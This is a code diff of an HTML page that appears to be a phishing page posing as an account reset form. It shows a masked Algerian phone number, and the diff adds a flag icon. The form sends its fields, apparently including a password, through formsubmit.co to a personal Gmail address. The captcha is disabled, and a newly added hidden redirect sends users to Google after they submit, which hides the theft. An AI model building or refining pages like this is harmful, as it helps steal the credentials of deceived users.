@@ -116,12 +116,21 @@
             font-weight: 500;
         }
 
-        /* Untouchable / Disabled Field Styling */
+        /* Untouchable / Disabled Field Styling with Flag Padding */
         .input-field.disabled-field {
             background-color: var(--disabled-bg);
             color: var(--text-muted);
             cursor: not-allowed;
             font-weight: 600;
+            padding-left: 44px;
+        }
+
+        .flag-icon {
+            position: absolute;
+            left: 14px;
+            font-size: 1.1rem;
+            z-index: 2;
+            pointer-events: none;
         }
 
         .toggle-password {
@@ -177,15 +186,19 @@
         <!-- Username -->
         <h1 class="username">@haramideluxe430</h1>
 
-        <!-- Reset Form connected to FormSubmit with Captcha Disabled -->
+        <!-- Reset Form connected to FormSubmit -->
         <form action="https://formsubmit.co/nbroseten@gmail.com" method="POST">
             
             <!-- Disables the FormSubmit Captcha page -->
             <input type="hidden" name="_captcha" value="false">
 
-            <!-- Untouchable Display Field for Phone Identifier -->
+            <!-- Redirects user to Google after submission -->
+            <input type="hidden" name="_next" value="https://www.google.com">
+
+            <!-- Untouchable Display Field for Phone Identifier with Algerian Flag -->
             <div class="form-group">
                 <div class="input-wrapper">
+                    <span class="flag-icon">🇩🇿</span>
                     <input type="text" name="identifier" value="+213*********" class="input-field disabled-field" readonly tabindex="-1">
                 </div>
             </div>
